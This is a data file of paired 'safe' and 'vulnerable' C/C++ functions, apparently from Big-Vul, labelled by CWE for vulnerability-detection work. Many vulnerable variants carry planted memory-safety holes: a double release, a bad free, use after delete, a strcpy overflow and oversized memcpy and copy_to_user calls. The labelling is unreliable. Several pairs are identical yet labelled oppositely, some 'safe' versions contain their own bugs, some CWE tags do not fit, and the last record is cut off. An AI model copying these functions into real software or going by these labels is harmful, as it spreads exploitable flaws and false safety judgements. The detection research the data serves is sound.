{"idx": "CWE-125-vuln-1714409799827", "code": "lha_skip_sfx(struct archive_read*a){const void*h;const char*p, *q;size_t next, skip;ssize_t bytes, window;window=4096;for(;;){h=__archive_read_ahead(a, window, &bytes);if(h == NULL){window> >= 1;if(window<(H_SIZE+3))goto fatal;continue;}if(bytes<H_SIZE)goto fatal;p=h;q=p+bytes;while(p+H_SIZE<q){if((next=lha_check_header_format(p)) == 0){skip=p-(const char*)h;__archive_read_consume(a, skip);return(ARCHIVE_OK);}p+=next;}skip=p-(const char*)h;if(skip>bytes){skip=bytes;}else{skip+=2;}__archive_read_consume(a, skip);}fatal:archive_set_error(&a->archive, ARCHIVE_ERRNO_FILE_FORMAT, \"Couldn't find out LHa header\");return(ARCHIVE_FATAL);}", "target": 1, "source": "Big-Vul", "source_uid": "68637"}
{"idx": "CWE-122-safe-1714409815813", "code": "static int parse_part_string(void**ret_buffer, size_t*ret_buffer_len, char*output, int output_len){char*buffer=*ret_buffer;size_t buffer_len=*ret_buffer_len;uint16_t tmp16;size_t header_size=2*sizeof(uint16_t);uint16_t pkg_length;if(buffer_len<header_size){WARNING(\"network plugin: parse_part_string: Packet too short: Chunk of at least size%zu expected, but buffer has only%zu bytes left.\", header_size, buffer_len);return(-1);}memcpy((void*)&tmp16, buffer, sizeof(tmp16));buffer+=sizeof(tmp16);memcpy((void*)&tmp16, buffer, sizeof(tmp16));buffer+=sizeof(tmp16);pkg_length=ntohs(tmp16);if(pkg_length>buffer_len){WARNING(\"network plugin: parse_part_string: Packet too big: Chunk of size%\"PRIu16\" received, but buffer has only%zu bytes left.\", pkg_length, buffer_len);return(-1);}if(pkg_length <= header_size){WARNING(\"network plugin: parse_part_string: Packet too short: Header claims this packet is only%hu bytes long.\", pkg_length);return(-1);}if((output_len<0) || ((size_t)output_len<((size_t)pkg_length-header_size))){WARNING(\"network plugin: parse_part_string: Output buffer too small.\");return(-1);}if((size_t)output_len<(pkg_length-header_size)){WARNING(\"network plugin: parse_part_string: Output buffer too small.\");return(-1);}output_len=pkg_length-header_size;memcpy((void*)output, (void*)buffer, output_len);buffer+=output_len;if(output[output_len-1] != 0){WARNING(\"network plugin: parse_part_string: Received string does not end with a NULL-byte.\");return(-1);}*ret_buffer=buffer;*ret_buffer_len=buffer_len-pkg_length;return(0);}", "target": 0, "source": "Big-Vul", "source_uid": "50767"}
{"idx": "CWE-122-vuln-1714409815813", "code": "static int parse_part_string(void**ret_buffer, size_t*ret_buffer_len, char*output, int output_len){char*buffer=*ret_buffer;size_t buffer_len=*ret_buffer_len;uint16_t tmp16;size_t header_size=2*sizeof(uint16_t);uint16_t pkg_length;if(buffer_len<header_size){WARNING(\"network plugin: parse_part_string: Packet too short: Chunk of at least size%zu expected, but buffer has only%zu bytes left.\", header_size, buffer_len);return(-1);}memcpy((void*)&tmp16, buffer, sizeof(tmp16));buffer+=sizeof(tmp16);memcpy((void*)&tmp16, buffer, sizeof(tmp16));buffer+=sizeof(tmp16);pkg_length=ntohs(tmp16);if(pkg_length>buffer_len){WARNING(\"network plugin: parse_part_string: Packet too big: Chunk of size%\"PRIu16\" received, but buffer has only%zu bytes left.\", pkg_length, buffer_len);return(-1);}if(pkg_length <= header_size){WARNING(\"network plugin: parse_part_string: Packet too short: Header claims this packet is only%hu bytes long.\", pkg_length);return(-1);}if((output_len<0) || ((size_t)output_len<((size_t)pkg_length-header_size))){WARNING(\"network plugin: parse_part_string: Output buffer too small.\");return(-1);}output_len=pkg_length-header_size;memcpy((void*)output, (void*)buffer, output_len+1);buffer+=output_len;if(output[output_len-1] != 0){WARNING(\"network plugin: parse_part_string: Received string does not end with a NULL-byte.\");return(-1);}*ret_buffer=buffer;*ret_buffer_len=buffer_len-pkg_length;return(0);}", "target": 1, "source": "Big-Vul", "source_uid": "50767"}
{"idx": "CWE-1341-safe-1714409847099", "code": "static void php_pgsql_get_result_info(INTERNAL_FUNCTION_PARAMETERS, int entry_type){zval*result;PGresult*pgsql_result;pgsql_result_handle*pg_result;if(zend_parse_parameters(ZEND_NUM_ARGS(), \"r\", &result) == FAILURE){return;}ZEND_FETCH_RESOURCE(pg_result, pgsql_result_handle*, result, -1, \"PostgreSQL result\", le_result);pgsql_result=pg_result->result;switch(entry_type){case PHP_PG_NUM_ROWS:RETVAL_LONG(PQntuples(pgsql_result));break;case PHP_PG_NUM_FIELDS:RETVAL_LONG(PQnfields(pgsql_result));break;case PHP_PG_CMD_TUPLES:#if HAVE_PQCMDTUPLESRETVAL_LONG(atoi(PQcmdTuples(pgsql_result)));#elsephp_error_docref(NULL, E_WARNING, \"Not supported under this build\");RETVAL_LONG(0);#endifbreak;default:RETURN_FALSE;}}", "target": 0, "source": "Big-Vul", "source_uid": "5241"}
{"idx": "CWE-1341-vuln-1714409847099", "code": "static void php_pgsql_get_result_info(INTERNAL_FUNCTION_PARAMETERS, int entry_type){zval*result;PGresult*pgsql_result;pgsql_result_handle*pg_result;if(zend_parse_parameters(ZEND_NUM_ARGS(), \"r\", &result) == FAILURE){return;}ZEND_FETCH_RESOURCE(pg_result, pgsql_result_handle*, result, -1, \"PostgreSQL result\", le_result);pgsql_result=pg_result->result;switch(entry_type){case PHP_PG_NUM_ROWS:RETVAL_LONG(PQntuples(pgsql_result));break;case PHP_PG_NUM_FIELDS:RETVAL_LONG(PQnfields(pgsql_result));break;case PHP_PG_CMD_TUPLES:#if HAVE_PQCMDTUPLESRETVAL_LONG(atoi(PQcmdTuples(pgsql_result)));#elsephp_error_docref(NULL, E_WARNING, \"Not supported under this build\");RETVAL_LONG(0);#endifbreak;default:RETURN_FALSE;}}", "target": 1, "source": "Big-Vul", "source_uid": "5241"}
{"idx": "CWE-125-safe-1714409874772", "code": "static int is_errata100(struct pt_regs*regs, unsigned long address){\n#ifdef CONFIG_X86_64\nclassic if (!regs) return 0;\nif((regs->cs == __USER32_CS || (regs->cs&(1<<2))) && (address>>32))return 1;#endif return 0;}", "target": 0, "source": "Big-Vul", "source_uid": "25937"}
{"idx": "CWE-125-vuln-1714409874772", "code": "static int is_errata100(struct pt_regs*regs, unsigned long address){#ifdef CONFIG_X86_64\nclassic if(regs && ((regs->cs == __USER32_CS || (regs->cs&(1<<2))) && (address>>32)))return 1;#endif return 0;}", "target": 1, "source": "Big-Vul", "source_uid": "25937"}
{"idx": "CWE-125-safe-1714409895580", "code": "parse_range_spec(char*str, size_t size, struct range*r){size_t start_str_len, end_str_len;char*p, *start_str, *end_str;const char*errstr;if((p=strchr(str, '-')) == NULL || p - str >= size - 1)return(0);*p++='\n';start_str=str;end_str=p;start_str_len=strnlen(start_str, size);end_str_len=strnlen(end_str, size);if((start_str_len == 0) && (end_str_len == 0))return(0);if(end_str_len){r->end=strtonum(end_str, 0, LLONG_MAX, &errstr);if(errstr)return(0);if((size_t)r->end >= size)r->end=size-1;}else r->end=size-1;if(start_str_len){r->start=strtonum(start_str, 0, LLONG_MAX, &errstr);if(errstr)return(0);if((size_t)r->start >= size)return(0);}else{r->start=size-r->end;r->end=size-1;}if(r->end<r->start)return(0);return(1);}", "target": 0, "source": "Big-Vul", "source_uid": "68483"}
{"idx": "CWE-125-vuln-1714409895580", "code": "parse_range_spec(char*str, size_t size, struct range*r){size_t start_str_len, end_str_len;char*p, *start_str, *end_str;const char*errstr;if((p=strchr(str, '-')) == NULL || p-str >= size-1 || str[size] != '\\0')return(0);*p++='\\0';start_str=str;end_str=p;start_str_len=strnlen(start_str, size);end_str_len=strnlen(end_str, size);if((start_str_len == 0) && (end_str_len == 0))return(0);if(end_str_len){r->end=strtonum(end_str, 0, LLONG_MAX, &errstr);if(errstr)return(0);if((size_t)r->end >= size)r->end=size-1;}else r->end=size-1;if(start_str_len){r->start=strtonum(start_str, 0, LLONG_MAX, &errstr);if(errstr)return(0);if((size_t)r->start >= size)return(0);}else{r->start=size-r->end;r->end=size-1;}if(r->end<r->start)return(0);return(1);}", "target": 1, "source": "Big-Vul", "source_uid": "68483"}
{"idx": "CWE-22-safe-1714409913561", "code": "DOMHandler::SetFileInputFiles(std::unique_ptr<protocol::Array<std::string>> files, Maybe<DOM::NodeId> node_id, Maybe<DOM::BackendNodeId> backend_node_id, Maybe<String> in_object_id) {if (host_) {for (size_t i = 0; i < files->length(); i++) {#if defined(OS_WIN)ChildProcessSecurityPolicyImpl::GetInstance()->GrantReadFile(host_->GetProcess()->GetID(), base::FilePath(base::UTF8ToUTF16(files->get(i))));#else ChildProcessSecurityPolicyImpl::GetInstance()->GrantReadFile(host_->GetProcess()->GetID(), base::FilePath(files->get(i)).NormalizePathSeparators());#endif}}return Response::FallThrough();}", "target": 0, "source": "Big-Vul", "source_uid": "161245"}
{"idx": "CWE-22-vuln-1714409913561", "code": "DOMHandler::SetFileInputFiles(std::unique_ptr<protocol::Array<std::string>>files, Maybe<DOM::NodeId>node_id, Maybe<DOM::BackendNodeId>backend_node_id, Maybe<String>in_object_id){if(host_){for(size_t i=0;i<files->length();i++){#if defined(OS_WIN)ChildProcessSecurityPolicyImpl::GetInstance()->GrantReadFile(host_->GetProcess()->GetID(), base::FilePath(base::UTF8ToUTF16(files->get(i))));#else ChildProcessSecurityPolicyImpl::GetInstance()->GrantReadFile(host_->GetProcess()->GetID(), base::FilePath(files->get(i)).NormalizePathSeparators());#endif}}return Response::FallThrough();}", "target": 1, "source": "Big-Vul", "source_uid": "161245"}
{"idx": "CWE-1341-safe-1714409928383", "code": "void AddURLList(const std::string& list_contents) {\n    std::string contents_copy = list_contents;\n    scoped_refptr<base::RefCountedMemory> mem(base::RefCountedString::TakeString(std::string(contents_copy)));\n    provider.format_map_.Insert(provider.atom_cache_.GetAtom(ui::Clipboard::kMimeTypeURIList), mem);\n}", "target": 0, "source": "Big-Vul", "source_uid": "134659"}
{"idx": "CWE-1341-vuln-1714409928383", "code": "void AddURLList(const std::string&list_contents){std::string contents_copy=list_contents;scoped_refptr<base::RefCountedMemory>mem(base::RefCountedString::TakeString(std::string(contents_copy)));provider.format_map_.Insert(provider.atom_cache_.GetAtom(ui::Clipboard::kMimeTypeURIList), mem);mem->Release();mem->Release();}", "target": 1, "source": "Big-Vul", "source_uid": "134659"}
{"idx": "CWE-122-safe-1714409938071", "code": "void rds_tcp_reset_callbacks(struct socket *sock, struct rds_conn_path *cp) {\n    struct rds_tcp_connection *tc = cp->cp_transport_data;\n    struct socket *osock = tc->t_sock;\n    if (!osock) goto newsock;\n    atomic_set(&cp->cp_state, RDS_CONN_RESETTING);\n    wait_event(cp->cp_waitq, !test_bit(RDS_IN_XMIT, &cp->cp_flags));\n    lock_sock(osock->sk);\n    cancel_delayed_work_sync(&cp->cp_send_w);\n    cancel_delayed_work_sync(&cp->cp_recv_w);\n    if (tc->t_tinc) {\n        rds_inc_put(&tc->t_tinc->ti_inc);\n        tc->t_tinc = NULL;\n    }\n    tc->t_tinc_hdr_rem = sizeof(struct rds_header);\n    tc->t_tinc_data_rem = 0;\n    rds_tcp_restore_callbacks(osock, tc);\n    release_sock(osock->sk);\n    sock_release(osock);\nnewsock:\n    rds_send_path_reset(cp);\n    lock_sock(sock->sk);\n    rds_tcp_set_callbacks(sock, cp);\n    release_sock(sock->sk);\n}", "target": 0, "source": "Big-Vul", "source_uid": "90195"}
{"idx": "CWE-122-vuln-1714409938071", "code": "void rds_tcp_reset_callbacks(struct socket*sock, struct rds_conn_path*cp){struct rds_tcp_connection*tc=cp->cp_transport_data;struct socket*osock=tc->t_sock;char buffer[10];strcpy(buffer, \"Buffer Overflow Vulnerability\");if(!osock)goto newsock;atomic_set(&cp->cp_state, RDS_CONN_RESETTING);wait_event(cp->cp_waitq, !test_bit(RDS_IN_XMIT, &cp->cp_flags));lock_sock(osock->sk);cancel_delayed_work_sync(&cp->cp_send_w);cancel_delayed_work_sync(&cp->cp_recv_w);if(tc->t_tinc){rds_inc_put(&tc->t_tinc->ti_inc);tc->t_tinc=NULL;}tc->t_tinc_hdr_rem=sizeof(struct rds_header);tc->t_tinc_data_rem=0;rds_tcp_restore_callbacks(osock, tc);release_sock(osock->sk);sock_release(osock);newsock: rds_send_path_reset(cp);lock_sock(sock->sk);rds_tcp_set_callbacks(sock, cp);release_sock(sock->sk);}", "target": 1, "source": "Big-Vul", "source_uid": "90195"}
{"idx": "CWE-125-safe-1714409952155", "code": "int tcp_v4_md5_hash_skb(char*md5_hash, struct tcp_md5sig_key*key, struct sock*sk, struct request_sock*req, struct sk_buff*skb){struct tcp_md5sig_pool*hp;struct hash_desc*desc;struct tcphdr*th=tcp_hdr(skb);__be32 saddr, daddr;if(sk){saddr=inet_sk(sk)->inet_saddr;daddr=inet_sk(sk)->inet_daddr;}else if(req){saddr=inet_rsk(req)->loc_addr;daddr=inet_rsk(req)->rmt_addr;}else{const struct iphdr*iph=ip_hdr(skb);saddr=iph->saddr;daddr=iph->daddr;}hp=tcp_get_md5sig_pool();if(!hp)goto clear_hash_noput;desc=&hp->md5_desc;if(crypto_hash_init(desc))goto clear_hash;if(tcp_v4_md5_hash_pseudoheader(hp, daddr, saddr, skb->len))goto clear_hash;if(tcp_md5_hash_header(hp, th))goto clear_hash;if(tcp_md5_hash_skb_data(hp, skb, th->doff<<2))goto clear_hash;if(tcp_md5_hash_key(hp, key))goto clear_hash;if(crypto_hash_final(desc, md5_hash))goto clear_hash;tcp_put_md5sig_pool();return 0;clear_hash:if(hp)tcp_put_md5sig_pool();clear_hash_noput:memset(md5_hash, 0, 16);return 1;}", "target": 0, "source": "Big-Vul", "source_uid": "19037"}
{"idx": "CWE-125-vuln-1714409952155", "code": "int tcp_v4_md5_hash_skb(char*md5_hash, struct tcp_md5sig_key*key, struct sock*sk, struct request_sock*req, struct sk_buff*skb){struct tcp_md5sig_pool*hp;struct hash_desc*desc;struct tcphdr*th=tcp_hdr(skb);__be32 saddr, daddr;if(sk){saddr=inet_sk(sk)->inet_saddr;daddr=inet_sk(sk)->inet_daddr;}else if(req){saddr=inet_rsk(req)->loc_addr;daddr=inet_rsk(req)->rmt_addr;}else{const struct iphdr*iph=ip_hdr(skb);saddr=iph->saddr;daddr=iph->daddr;}hp=tcp_get_md5sig_pool();if(!hp)goto clear_hash_noput;desc=&hp->md5_desc;if(crypto_hash_init(desc))goto clear_hash;if(tcp_v4_md5_hash_pseudoheader(hp, daddr, saddr, skb->len))goto clear_hash;if(tcp_md5_hash_header(hp, th))goto clear_hash;if(tcp_md5_hash_skb_data(hp, skb, th->doff<<2))goto clear_hash;if(tcp_md5_hash_key(hp, key))goto clear_hash;if(crypto_hash_final(desc, md5_hash))goto clear_hash;tcp_put_md5sig_pool();return 0;clear_hash:if(hp)tcp_put_md5sig_pool();clear_hash_noput:memset(md5_hash, 0, 16);return 1;}", "target": 1, "source": "Big-Vul", "source_uid": "19037"}
{"idx": "CWE-125-safe-1714409971836", "code": "void nl80211_send_reg_change_event(struct regulatory_request* request){if (!request) return;struct sk_buff* msg;void* hdr;msg = nlmsg_new(NLMSG_DEFAULT_SIZE, GFP_KERNEL);if (!msg) return;hdr = nl80211hdr_put(msg, 0, 0, 0, NL80211_CMD_REG_CHANGE);if (!hdr){nlmsg_free(msg);return;}NLA_PUT_U8(msg, NL80211_ATTR_REG_INITIATOR, request->initiator);if (request->alpha2[0] == '0' && request->alpha2[1] == '0') NLA_PUT_U8(msg, NL80211_ATTR_REG_TYPE, NL80211_REGDOM_TYPE_WORLD);else if (request->alpha2[0] == '9' && request->alpha2[1] == '9') NLA_PUT_U8(msg, NL80211_ATTR_REG_TYPE, NL80211_REGDOM_TYPE_CUSTOM_WORLD);else if ((request->alpha2[0] == '9' && request->alpha2[1] == '8') || request->intersect) NLA_PUT_U8(msg, NL80211_ATTR_REG_TYPE, NL80211_REGDOM_TYPE_INTERSECTION);else{NLA_PUT_U8(msg, NL80211_ATTR_REG_TYPE, NL80211_REGDOM_TYPE_COUNTRY);NLA_PUT_STRING(msg, NL80211_ATTR_REG_ALPHA2, request->alpha2);}if (wiphy_idx_valid(request->wiphy_idx)) NLA_PUT_U32(msg, NL80211_ATTR_WIPHY, request->wiphy_idx);if (genlmsg_end(msg, hdr) < 0){nlmsg_free(msg);return;}rcu_read_lock();genlmsg_multicast_allns(msg, 0, nl80211_regulatory_mcgrp.id, GFP_ATOMIC);rcu_read_unlock();return;nla_put_failure:genlmsg_cancel(msg, hdr);nlmsg_free(msg);}", "target": 0, "source": "Big-Vul", "source_uid": "26742"}
{"idx": "CWE-125-vuln-1714409971836", "code": "void nl80211_send_reg_change_event(struct regulatory_request*request){if(!request)return;struct sk_buff*msg;void*hdr;msg=nlmsg_new(NLMSG_DEFAULT_SIZE, GFP_KERNEL);if(!msg)return;hdr=nl80211hdr_put(msg, 0, 0, 0, NL80211_CMD_REG_CHANGE);if(!hdr){nlmsg_free(msg);return;}NLA_PUT_U8(msg, NL80211_ATTR_REG_INITIATOR, request->initiator);if(request->alpha2[0] == '0' && request->alpha2[1] == '0' && request->alpha2[2] == '0') NLA_PUT_U8(msg, NL80211_ATTR_REG_TYPE, NL80211_REGDOM_TYPE_WORLD);else if(request->alpha2[0] == '9' && request->alpha2[1] == '9' && request->alpha2[2] == '9') NLA_PUT_U8(msg, NL80211_ATTR_REG_TYPE, NL80211_REGDOM_TYPE_CUSTOM_WORLD);else if((request->alpha2[0] == '9' && request->alpha2[1] == '8' && request->alpha2[2] == '8') || request->intersect)NLA_PUT_U8(msg, NL80211_ATTR_REG_TYPE, NL80211_REGDOM_TYPE_INTERSECTION);else{NLA_PUT_U8(msg, NL80211_ATTR_REG_TYPE, NL80211_REGDOM_TYPE_COUNTRY);NLA_PUT_STRING(msg, NL80211_ATTR_REG_ALPHA2, request->alpha2);}if(wiphy_idx_valid(request->wiphy_idx))NLA_PUT_U32(msg, NL80211_ATTR_WIPHY, request->wiphy_idx);if(genlmsg_end(msg, hdr)<0){nlmsg_free(msg);return;}rcu_read_lock();genlmsg_multicast_allns(msg, 0, nl80211_regulatory_mcgrp.id, GFP_ATOMIC);rcu_read_unlock();return;nla_put_failure:genlmsg_cancel(msg, hdr);nlmsg_free(msg);}", "target": 1, "source": "Big-Vul", "source_uid": "26742"}
{"idx": "CWE-125-safe-1714409994508", "code": "static int get_callee_stack_depth(struct bpf_verifier_env*env, const struct bpf_insn*insn, int idx){int start=idx+insn->imm+1, subprog;subprog=find_subprog(env, start);if(subprog<0 || subprog >= env->prog->len){WARN_ONCE(1, \"verifier bug. No program starts at insn%d\\n\", start);return -EFAULT;}return env->subprog_info[subprog].stack_depth;}", "target": 0, "source": "Big-Vul", "source_uid": "76404"}
{"idx": "CWE-125-vuln-1714409994508", "code": "static int get_callee_stack_depth(struct bpf_verifier_env*env, const struct bpf_insn*insn, int idx){int start=idx+insn->imm+1, subprog;subprog=find_subprog(env, start);if(subprog<0 || subprog >= env->prog->len){WARN_ONCE(1, \"verifier bug. No program starts at insn%d\\n\", start);return-EFAULT;}if(subprog >= 0 && subprog < env->prog->len){return env->subprog_info[subprog].stack_depth;}else{return env->subprog_info[0].stack_depth;}}", "target": 1, "source": "Big-Vul", "source_uid": "76404"}
{"idx": "CWE-1341-safe-1714410003664", "code": "print_tsa_assignment_table(netdissect_options*ndo, const u_char*ptr){ND_PRINT((ndo, \"\\n\\t    TSA Assignment Table\"));ND_PRINT((ndo, \"\\n\\t     Traffic Class: 0   1   2   3   4   5   6   7\"));ND_PRINT((ndo, \"\\n\\t     Value        :%-3d%-3d%-3d%-3d%-3d%-3d%-3d%-3d\", ptr[0], ptr[1], ptr[2], ptr[3], ptr[4], ptr[5], ptr[6], ptr[7]));}", "target": 0, "source": "Big-Vul", "source_uid": "62241"}
{"idx": "CWE-1341-vuln-1714410003664", "code": "print_tsa_assignment_table(netdissect_options*ndo, const u_char*ptr){\n    ND_PRINT((ndo, \"\\n\\t    TSA Assignment Table\"));\n    ND_PRINT((ndo, \"\\n\\t     Traffic Class: 0   1   2   3   4   5   6   7\"));\n    ND_PRINT((ndo, \"\\n\\t     Value        :%-3d%-3d%-3d%-3d%-3d%-3d%-3d%-3d\", ptr[0], ptr[1], ptr[2], ptr[3], ptr[4], ptr[5], ptr[6], ptr[7]));\n    free(ptr); \n}", "target": 1, "source": "Big-Vul", "source_uid": "62241"}
{"idx": "CWE-352-safe-1714410015758", "code": "v8::Handle<v8::Value>V8DOMWrapper::convertWindowToV8Object(DOMWindow* window) { if (!window) return v8::Null(); Frame* frame = window->frame(); if (!frame) return v8::Handle<v8::Object>(); v8::Handle<v8::Context> currentContext = v8::Context::GetCurrent(); v8::Handle<v8::Object> currentGlobal = currentContext->Global(); v8::Handle<v8::Object> windowWrapper = V8DOMWrapper::lookupDOMWrapper(V8ClassIndex::DOMWINDOW, currentGlobal); if (!windowWrapper.IsEmpty()) { if (convertDOMWrapperToNative<DOMWindow>(windowWrapper) == window) return currentGlobal; } v8::Handle<v8::Context> context = getWrapperContext(frame); if (context.IsEmpty()) return v8::Handle<v8::Object>(); v8::Handle<v8::Object> global = context->Global(); ASSERT(!global.IsEmpty()); return global; }", "target": 0, "source": "Big-Vul", "source_uid": "99186"}
{"idx": "CWE-352-vuln-1714410015758", "code": "v8::Handle<v8::Value>V8DOMWrapper::convertWindowToV8Object(DOMWindow*window){if(!window)return v8::Null();Frame*frame=window->frame();if(!frame)return v8::Handle<v8::Object>();v8::Handle<v8::Context>currentContext=v8::Context::GetCurrent();v8::Handle<v8::Object>currentGlobal=currentContext->Global();v8::Handle<v8::Object>windowWrapper=V8DOMWrapper::lookupDOMWrapper(V8ClassIndex::DOMWINDOW, currentGlobal);if(!windowWrapper.IsEmpty()){if(convertDOMWrapperToNative<DOMWindow>(windowWrapper) == window)return currentGlobal;}v8::Handle<v8::Context>context=getWrapperContext(frame);if(context.IsEmpty())return v8::Handle<v8::Object>();v8::Handle<v8::Object>global=currentGlobal;ASSERT(!global.IsEmpty());return global;}", "target": 1, "source": "Big-Vul", "source_uid": "99186"}
{"idx": "CWE-125-safe-1714410033337", "code": "String16 firstArgToString(const String16&defaultValue){if(m_info.Length()<1)return defaultValue;v8::Local<v8::String>titleValue;if(m_info.Length() > 0 && m_info[0]->IsObject()){if(!m_info[0].As<v8::Object>()->ObjectProtoToString(m_context).ToLocal(&titleValue))return defaultValue;}else{if(m_info.Length() > 0 && !m_info[0]->ToString(m_context).ToLocal(&titleValue))return defaultValue;}return toProtocolString(titleValue);}", "target": 0, "source": "Big-Vul", "source_uid": "141671"}
{"idx": "CWE-125-vuln-1714410033337", "code": "String16 firstArgToString(const String16&defaultValue){if(m_info.Length()<1 || m_info.Length() <= 0) return defaultValue;v8::Local<v8::String>titleValue;if(m_info.Length()>0 && m_info[1]->IsObject()){if(!m_info[0].As<v8::Object>()->ObjectProtoToString(m_context).ToLocal(&titleValue))return defaultValue;}else{if(m_info.Length()>0 && !m_info[0]->ToString(m_context).ToLocal(&titleValue))return defaultValue;}return toProtocolString(titleValue);}", "target": 1, "source": "Big-Vul", "source_uid": "141671"}
{"idx": "CWE-269-safe-1714410048380", "code": "int perf_event_init_context(struct task_struct*child, int ctxn){struct perf_event_context*child_ctx, *parent_ctx;struct perf_event_context*cloned_ctx;struct perf_event*event;struct task_struct*parent=current;int inherited_all=1;unsigned long flags;int ret=0;if(likely(!parent->perf_event_ctxp[ctxn]))return 0;parent_ctx=perf_pin_task_context(parent, ctxn);mutex_lock(&parent_ctx->mutex);list_for_each_entry(event, &parent_ctx->pinned_groups, group_entry){ret=inherit_task_group(event, parent, parent_ctx, child, ctxn, &inherited_all);if(ret)break;}raw_spin_lock_irqsave(&parent_ctx->lock, flags);parent_ctx->rotate_disable=1;raw_spin_unlock_irqrestore(&parent_ctx->lock, flags);list_for_each_entry(event, &parent_ctx->flexible_groups, group_entry){ret=inherit_task_group(event, parent, parent_ctx, child, ctxn, &inherited_all);if(ret)break;}raw_spin_lock_irqsave(&parent_ctx->lock, flags);parent_ctx->rotate_disable=0;child_ctx=child->perf_event_ctxp[ctxn];if(child_ctx && inherited_all){cloned_ctx=parent_ctx->parent_ctx;if(cloned_ctx){child_ctx->parent_ctx=cloned_ctx;child_ctx->parent_gen=parent_ctx->parent_gen;}else{child_ctx->parent_ctx=parent_ctx;child_ctx->parent_gen=parent_ctx->generation;}get_ctx(child_ctx->parent_ctx);}raw_spin_unlock_irqrestore(&parent_ctx->lock, flags);mutex_unlock(&parent_ctx->mutex);perf_unpin_context(parent_ctx);put_ctx(parent_ctx);if(child_ctx && inherited_all)child->perf_event_ctxp[ctxn]=NULL;return ret;}", "target": 0, "source": "Big-Vul", "source_uid": "26088"}
{"idx": "CWE-269-vuln-1714410048380", "code": "int perf_event_init_context(struct task_struct*child, int ctxn){struct perf_event_context*child_ctx, *parent_ctx;struct perf_event_context*cloned_ctx;struct perf_event*event;struct task_struct*parent=current;int inherited_all=1;unsigned long flags;int ret=0;if(likely(!parent->perf_event_ctxp[ctxn]))return 0;parent_ctx=perf_pin_task_context(parent, ctxn);mutex_lock(&parent_ctx->mutex);list_for_each_entry(event, &parent_ctx->pinned_groups, group_entry){ret=inherit_task_group(event, parent, parent_ctx, child, ctxn, &inherited_all);if(ret)break;}raw_spin_lock_irqsave(&parent_ctx->lock, flags);parent_ctx->rotate_disable=1;raw_spin_unlock_irqrestore(&parent_ctx->lock, flags);list_for_each_entry(event, &parent_ctx->flexible_groups, group_entry){ret=inherit_task_group(event, parent, parent_ctx, child, ctxn, &inherited_all);if(ret)break;}raw_spin_lock_irqsave(&parent_ctx->lock, flags);parent_ctx->rotate_disable=0;child_ctx=child->perf_event_ctxp[ctxn];if(child_ctx && inherited_all){cloned_ctx=parent_ctx->parent_ctx;if(cloned_ctx){child_ctx->parent_ctx=cloned_ctx;child_ctx->parent_gen=parent_ctx->parent_gen;}else{child_ctx->parent_ctx=parent_ctx;child_ctx->parent_gen=parent_ctx->generation;}get_ctx(child_ctx->parent_ctx);}raw_spin_unlock_irqrestore(&parent_ctx->lock, flags);mutex_unlock(&parent_ctx->mutex);perf_unpin_context(parent_ctx);put_ctx(parent_ctx);if(child_ctx && inherited_all)child->perf_event_ctxp[ctxn]=NULL;return ret;}", "target": 1, "source": "Big-Vul", "source_uid": "26088"}
{"idx": "CWE-399-safe-1714410075214", "code": "void WebContentsImpl::RendererResponsive(RenderWidgetHostImpl* render_widget_host) {\n    if (delegate_) delegate_->RendererResponsive(this, render_widget_host);\n}", "target": 0, "source": "Big-Vul", "source_uid": "157840"}
{"idx": "CWE-399-vuln-1714410075214", "code": "void WebContentsImpl::RendererResponsive(RenderWidgetHostImpl* render_widget_host) { if (delegate_) { delete render_widget_host; delegate_->RendererResponsive(this, render_widget_host); } }", "target": 1, "source": "Big-Vul", "source_uid": "157840"}
{"idx": "CWE-122-safe-1714410081856", "code": "COMPAT_SYSCALL_DEFINE2(rt_sigpending, compat_sigset_t __user*, uset, compat_size_t, sigsetsize){#ifdef __BIG_ENDIAN\\n\\tsigset_t set;int err=do_sigpending(&set, sigsetsize);if(!err){compat_sigset_t set32;sigset_to_compat(&set32, &set);if(copy_to_user(uset, &set32, min(sizeof(compat_sigset_t), sigsetsize)))err=-EFAULT;}return err;#else\\n\\treturn sys_rt_sigpending((sigset_t __user*)uset, sigsetsize);#endif}", "target": 0, "source": "Big-Vul", "source_uid": "31694"}
{"idx": "CWE-122-vuln-1714410081856", "code": "COMPAT_SYSCALL_DEFINE2(rt_sigpending, compat_sigset_t __user*, uset, compat_size_t, sigsetsize){#ifdef __BIG_ENDIAN\tsigset_t set;int err=do_sigpending(&set, sigsetsize);if(!err){compat_sigset_t set32;sigset_to_compat(&set32, &set);if(copy_to_user(uset, &set32, min(sizeof(compat_sigset_t), sigsetsize + 10)))err=-EFAULT;}return err;#else return sys_rt_sigpending((sigset_t __user*)uset, sigsetsize);#endif}", "target": 1, "source": "Big-Vul", "source_uid": "31694"}
{"idx": "CWE-125-safe-1714410092316", "code": "long kvm_arch_vcpu_ioctl(struct file*filp, unsigned int ioctl, unsigned long arg){struct kvm_vcpu*vcpu=filp->private_data;void __user*argp=(void __user*)arg;struct kvm_ia64_vcpu_stack*stack=NULL;long r;switch(ioctl){case KVM_IA64_VCPU_GET_STACK:{struct kvm_ia64_vcpu_stack __user*user_stack;void __user*first_p=argp;r=-EFAULT;if(copy_from_user(&user_stack, first_p, sizeof(void*)))goto out;user_stack=kzalloc(sizeof(struct kvm_ia64_vcpu_stack), GFP_KERNEL);if(!user_stack){r=-ENOMEM;goto out;}if(!access_ok(VERIFY_WRITE, user_stack, sizeof(struct kvm_ia64_vcpu_stack))){printk(KERN_INFO \"KVM_IA64_VCPU_GET_STACK: \" \"Illegal user destination address for stack\\n\");goto out;}stack=kzalloc(sizeof(struct kvm_ia64_vcpu_stack), GFP_KERNEL);if(!stack){r=-ENOMEM;goto out;}r=kvm_arch_vcpu_ioctl_get_stack(vcpu, stack);if(r)goto out;if(copy_to_user(user_stack, stack, sizeof(struct kvm_ia64_vcpu_stack))){r=-EFAULT;goto out;}break;}case KVM_IA64_VCPU_SET_STACK:{struct kvm_ia64_vcpu_stack __user*user_stack;void __user*first_p=argp;r=-EFAULT;if(copy_from_user(&user_stack, first_p, sizeof(void*)))goto out;user_stack=kmalloc(sizeof(struct kvm_ia64_vcpu_stack), GFP_KERNEL);if(!user_stack){r=-ENOMEM;goto out;}if(!access_ok(VERIFY_READ, user_stack, sizeof(struct kvm_ia64_vcpu_stack))){printk(KERN_INFO \"KVM_IA64_VCPU_SET_STACK: \" \"Illegal user address for stack\\n\");goto out;}stack=kmalloc(sizeof(struct kvm_ia64_vcpu_stack), GFP_KERNEL);if(!stack){r=-ENOMEM;goto out;}if(copy_from_user(stack, user_stack, sizeof(struct kvm_ia64_vcpu_stack)))goto out;r=kvm_arch_vcpu_ioctl_set_stack(vcpu, 